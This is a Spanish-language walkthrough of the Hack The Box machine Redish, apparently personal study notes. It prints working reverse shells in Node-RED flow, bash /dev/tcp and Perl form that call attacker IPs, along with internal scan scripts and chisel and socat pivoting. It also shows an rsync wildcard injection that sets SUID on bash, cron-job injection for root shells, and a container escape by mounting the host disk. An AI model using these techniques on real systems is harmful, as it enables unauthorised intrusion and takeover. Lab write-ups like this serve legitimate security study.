# Redish

## NMAP

![image](https://github.com/gecr07/RedishHTB/assets/63270579/325411cf-e1b7-49a2-b667-067b49606bb8)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/911975ed-cde7-47ac-8df7-904c60b548c9)

Ahora (no hubiera sabido como la verdad) visitamos el link.

> http://10.10.10.94:1880/red/e72c52ec2ba93670b5b9fcc018afcdff

![image](https://github.com/gecr07/RedishHTB/assets/63270579/e38e48cf-9265-49b5-a93c-1bd6a15f2ffb)

Para la shell reversa se usa:

```
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.126","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]

```

Una vez dentro pues nos damos cuenta que la shell esta muy precaria ( y asi lo hacen todos los writes que he visto nos mandamos otro shell


```
[object Object]bash -c "bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/484e0234-1c4e-4ba5-b818-23bd4fb61d5a)

## Descubrimiento de IPs vivas.

```
#!/bin/bash

echo "Hola estoy dentro"

networks=(172.18.0 172.19.0)



for  network in ${networks[@]}; do
echo "[+] Estoy escaneo  la red $network.0/24"
for i in $(seq 1 254); do

        timeout 1 bash -c "ping -c 1  $network.$i" &>/dev/null && echo -e "\t\t [+] La ip $network.$i -ACTIVE" &

done;wait 
done

echo "Este es el final"


```

## Puertos Abiertos

```
#!/bin/bash

echo "Hola estoy dentro"

hosts=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)



for  host in ${hosts[@]}; do
echo -e "\n [+] Estoy escaneo  la red $host"
for port in $(seq 1 10000); do

        timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t [+] Port $port - OPEN" &

done;wait 
done

echo "Este es el final"


```
Cabe destacar que el puerto 1880 fue por donde entramos del nodered s4vitar dice que lo mas probable es que le aga un forwad y lo exponga hacia afuera. Tambien es importante destacar como subirmos esos scripts.

```
cat ports.sh| base64 -w0 | xclip -sel clip
 base64  ports.sh -w0 | xclip -sel clip # es completamente lo mismo.
```

Con la opcion -w0 nos imprime todo sin saltos de linea y da menos error intentar usar este en la medida de lo posible.

## Alternativa

O bien si queremos subir el nmap y no existe nada no hay nc no python no wget no curl existen funciones de wget y curl que permiten descargar incluso archivos creadas completamente con bash.

> https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et

```
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```


Su uso 

```
__curl http://IP/archivo > archivo

```

# Compilar y bajar de peso el chisel

![image](https://github.com/gecr07/RedishHTB/assets/63270579/847ec256-cfc7-4250-a480-2e1d89d641af)

```
go build .
du -hc chisel # Pesa 12 MB
sudo go build -ldflags "-s -w" .
sudo upx chisel 
du -hc chisel # pesa 3 MB!!!

```

## CHISEL PortForwarding

Entonces chisel funciona asi la maquina Kali va a ser el servidor y la maquina victima e cliente.


Cliente (victima)
```
./chisel client 10.10.14.11:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6373

chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80
                          El puerto 80 de este equipo se convierta en el puerto 80 de mi equipo.
Y no acaba ahi puedes meterle multiples puertos

chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80 R:6379:172.19.0.2:6379
Lo ulitmo le dice el puerto 6379 de la ip quiero que se convierta en el puero 6379 de mi computadora.
```

Servidor (Kali)
```
chisel server --reverse -p 1234
```

Y lo magico es que entonces puedes escanear con nmap porque entonces ahora nada mas especifica el puerto

```
nmap -sCV -p6379 127.0.0.1 
```


![image](https://github.com/gecr07/RedishHTB/assets/63270579/1090c4b9-0272-4897-afca-29f4885cb455)


Ahora en la pagina que encontramos encontramos rutas. ( por lo menos S4vitar de pregunto y si esas rutas estan dentro de /var/www/html/ruta y asi fue el razonamiento)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/9253e88b-d334-4f05-ad47-58d2a963f556)

Entonces vamos a hacktricks y leemos que existe una manera de lograr RCE.

## PIVOTING (sotcat)


```

Nodered ( hostname)

eth0  (interfaz de Nodered) 172.18.0.2/16

        [+] Host 172.18.0.2 -ACTIVE <- (Nodered) [PWNED]
               [+] Port 1880 - OPEN
        [+] Host 172.18.0.1 -ACTIVE <- Maquina Host
               [+] Port 1880 - OPEN


eth1 (interfaz de Nodered) 172.19.0.4/16

      [+] La ip 172.19.0.4 -ACTIVE <- (Nodered) [PWNED] -> 1111 -> ./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 &

               [+] Port 1880 - OPEN
      [+] La ip 172.19.0.3 -ACTIVE (hints) == Tenenmos ejecucion de comandos mediante web shell (pero no podemos tener conectividad con Kali solo la IP del segmento)
               [+] Port 80 - OPEN
      [+] La ip 172.19.0.2 -ACTIVE ( redis) ==
               [+] Port 6379 - OPEN


      [+] La ip 172.19.0.1 -ACTIVE <- Maquina Host

```

Entonces tenemos la  172.19.0.4 PWNED desde el incio y logramos comand execution en la 172.19.0.3 ( que a su vez tiene ips nuevas que no habiamos visto osea alcanza otras redes). Ahora lo que vamos a hacer para poder
seguir es mandarnos una reverse shell a la  172.19.0.4 (que si tiene conectividad porque estan en el mismo segmento) OJO y es aqui donde pusimos el SOTCAT que redirige todo el trafico del puerto 1111 a la IP_KALI por el 
puerto 2222 y bum tenemos una shell en Kali y ahora podemos alzar otras redes.

Cabe destacar que tomamos un binario estatico del mismo repo del nmap este:

> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

```
__curl http://10.10.14.67/chisel > chisel
./chisel server --reverse -p 1234
./chisel client 10.10.14.67:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
__curl http://10.10.14.67/socat >socat
./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 & #Por cierto que dejamos corriendo en segundo plano

```
A y para la shell usamos una de perl y pusimos %26 en lugar de & (url encode) para que no nos diera problemas.

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/2f00b438-928b-4ea7-9d01-eb32cc1f5671)

Esta es la Ip que nosotros veiamos 172.19.0.3 y en la imagen puedes ver que hay otra de otro segmento escondido para nosotros.



Ahora no se puede hacer nada ni ver la flag asi que necesitamos escalar privilegios usamos:

```
#!/bin/bash

old_process=$(ps -eo command)


while true; do 
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon"
        old_process=$new_process
done

```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/76cff56c-b1ea-4f6a-8862-9722a7d467c7)

## Cron como funciona porfin lo entiendo

Pues dentro de /etc existen varios: cron.daily/   cron.hourly/  cron.monthly/ cron.weekly/ cuando tu metes un archivo aqui se ejecuta semanalmente, mensualmente, diariamente o cada hora. Poniendo ahi dentro de esa carpta un script se ejecuta ( con permisos eso si no se).

> /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.monthly/: Estos directorios tienen una estructura específica para las tareas cron que se ejecutarán diaria, semanal y mensualmente, respectivamente. En lugar de colocar archivos con comandos cron, los scripts o comandos en estos directorios se ejecutan automáticamente según su nombre y la frecuencia correspondiente. Por ejemplo, los scripts en /etc/cron.daily/ se ejecutan diariamente sin la necesidad de agregar archivos de configuración adicionales.

Por otro lado existe la carpeta /etc/cron.d esta es una carpeta especial porque te permite personalizar cada cuanto se ejecuta la tarea.


> /etc/cron.d/: En este directorio, puedes colocar archivos con tareas cron adicionales que no están vinculadas a usuarios específicos. Los archivos en este directorio siguen el formato de las entradas de crontab regulares, pero se separan para facilitar la administración y organización de las tareas.

```
echo "* * * * * root sh /tmp/reverse.sh" > /etc/cron.d/tarea
```

## Threats Segundo plano jobs &

Cuando tu quieres que un programa se ejecute en segundo plano lo que haces es meterle un & al final ejemplo:

```
./socat TCP-LISTEN:1111,fork TCP:10.10.14.67:2222 &

```

Ahora que pasa si queremos detenerlo y volverlo a inciar para el caso que no funcionara bien.

### Comando foreground o primer plano

Podemos traer al frente ese trabajo con este comando (fg) y parar el comando Ctrl + Z y despues volverlo a ejecutar.

### Comando bg

![image](https://github.com/gecr07/RedishHTB/assets/63270579/4221aeec-2410-4903-b46b-d1230585343a)

Que entiendo que esto seria lo mismo que poner un & al final.

![image](https://github.com/gecr07/RedishHTB/assets/63270579/fc278b78-b625-471b-96bd-45abe0fbd8b3)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/759d59f9-75bd-4a8c-ab5d-7b33daf5d3d9)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/9d6c4b57-e268-48d1-8084-6fead4746137)

Nos hacemos root nos damos cuenta que esta cosa tiene una tarea cron que hace un rsync:

![image](https://github.com/gecr07/RedishHTB/assets/63270579/b41eb348-3ffe-41f7-926c-7586bd172117)

Abusamos de el wildcard de rsync 

```
# 1.rdb
#!/bin/bash

chmod +s /bin/bash
```

En la maquina www-data:

```
base64 1.rdb -w0 | xclip -sel clip > 1.rdb
touch -- "-e sh 1.rdb # metes el -- para que te deje poner cualquier nombre y no interprete el - como parametro

```

## Mapa de red

Entonces 

```
[+] Enumerando el network 172.18.0.0/24

                 [+] La ip 172.18.0.2 -ACTIVE <-- (nodered) [PWNED]
                           [+] Port 1880 - OPEN
                 [+] La ip 172.18.0.1 -ACTIVE <-- Maquina Host
                           [+] Port 1880 - OPEN


[+] Enumerando el network 172.19.0.0/24
                 [+] La ip 172.19.0.4 -ACTIVE <-- (nodered) [PWNED]
                           [+] Port 1880 - OPEN

                 [+] La ip 172.19.0.3 -ACTIVE <-- (www) [PWNED] X
                           [+] Port 80 - OPEN

                 [+] La ip 172.19.0.2 -ACTIVE (redish)
                           [+] Port 6379 - OPEN
                 [+] La ip 172.19.0.1 -ACTIVE <-- Maquina Host

[+] Enumerando el network 172.20.0.0/24


                  [+] Host  172.20.0.2 <-- (backup)

                  [+] Host  172.20.0.3 <-- (www) X
```

## RSYNC

Ya un vez que tenemos acceso root podemos hacer ping y podemos usar el rsync sin restriciones.

![image](https://github.com/gecr07/RedishHTB/assets/63270579/614bf36a-62dd-486b-b458-34e3d86a8b28)

Ojo me di cuenta que es el directorio el que anda causando problemas el f1 no se que intenta no usarlo.

Para descargar un archivo con el rsync:

```
rsync rsync://backup:873/src/etc/passwd passwd
```

## Socat

Ahora como podemos leer y escribir con RSYNC podemos inyectar una tarea cron y poner a la escucha el socat como si de un nc se tratara!!


Ahora como no tenemos conectividad hasta esa maquina el SOCAT tambien puede servir de nc(por lo que puedo entender)

```
./socat TCP-LISTEN:5555
```

Insertando una tarea cron:

```
echo '* * * * * root sh /tmp/reverse.sh' > reverse
```

Pero como subimos socat¿? Pues como estamos en 172.20.0.3,172.19.0.3 pero y ahi alcanzamos 172.19.0.4 la cual tiene un socat en el 1111 que redirecciona a la Kali por el puerto 2222 entonces:

En la 172.20.0.3 <-- (www) X

![image](https://github.com/gecr07/RedishHTB/assets/63270579/50ce24bf-8e1b-4847-8f46-30ad28c7bfef)

Entonces ahora pues en el segmento ese nuevo que encontramos la backup le metemos una tarea cron.

```
echo "* * * * * root sh /tmp/reverse.sh" > tarea
rsync reverse rsync
rsync reverse rsync://172.20.0.3/src/etc/cron.d/reverse
echo "perl reverse" | base64 -d > reverse.sh # estamos en www vamos a backup
rsync reverse.sh rsync://172.20.0.3/src/tmp/reverse.sh
#Revisa si se escribio.
rsync  rsync://172.20.0.3/src/tmp/
# En www ./socat TCP-LISTEN:5555 stdout 
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/7c187603-b106-40e2-ac83-853b51350f82)

Ganamos el root pero aun no podemo leer la flag de root.

## Disk free (df)
Entonces vamos listar mas el sistema porque la flag aun estariamos en contenedor y la flag ya estaria en redish la maquina oficial. Este comanod siver para ver 

![image](https://github.com/gecr07/RedishHTB/assets/63270579/80ebf37a-c5dd-4736-a474-009842786806)

> El comando du en Linux se utiliza para mostrar el uso del espacio en disco de archivos y directorios. Su nombre proviene de "Disk Usage" (uso de disco). Con du, puedes obtener información sobre el tamaño total utilizado por archivos y directorios en el sistema de archivos.(usalo igual du -h

## /dev/sda

> El directorio /dev/sda* en Linux representa un dispositivo de bloque, específicamente una unidad de almacenamiento, como un disco duro o una unidad de estado sólido (SSD). La letra "s" se refiere a "scsi" o "serial," aunque actualmente también representa dispositivos SATA, SAS y NVMe. La letra "a" es una designación de letra para la primera unidad de almacenamiento detectada en el sistema, y el asterisco "*" indica que puede haber otras particiones asociadas con la unidad.

>En un sistema con una sola unidad de almacenamiento, podrías encontrar /dev/sda, y si hay particiones en esa unidad, se numerarán consecutivamente como /dev/sda1, /dev/sda2, etc. Si tienes múltiples unidades de almacenamiento en el sistema, podrías encontrar /dev/sdb, /dev/sdc, y así sucesivamente.

```
ls /dev/sda*

```

## Montar una particion

![image](https://github.com/gecr07/RedishHTB/assets/63270579/704b82dd-9089-433d-8c28-19a0012f4f5a)

```
root@backup:~# mkdir /mnt/test
root@backup:~# mount /dev/sda2 /mnt/test/

```

Y nos damos cuenta que trabaja con monturas

![image](https://github.com/gecr07/RedishHTB/assets/63270579/bee73cc6-4f49-4792-9860-31ba46c07b71)

Entonces estamos viendo el file system de la maquina redish por lo que podriamos aplicar la misma del cron y ganar una shell root ya en la maquina principal(redish).

![image](https://github.com/gecr07/RedishHTB/assets/63270579/7e81cae8-e859-4219-86ed-e0821a654a7d)

Finalmente:

![image](https://github.com/gecr07/RedishHTB/assets/63270579/babfaf8f-21c6-4839-a035-227240ce999b)

Podemos ver todas las interfaces que arrastra esta maquina.

![image](https://github.com/gecr07/RedishHTB/assets/63270579/35b56a8d-315a-4e3e-8dcc-6d6293aee67b)


FIN...















































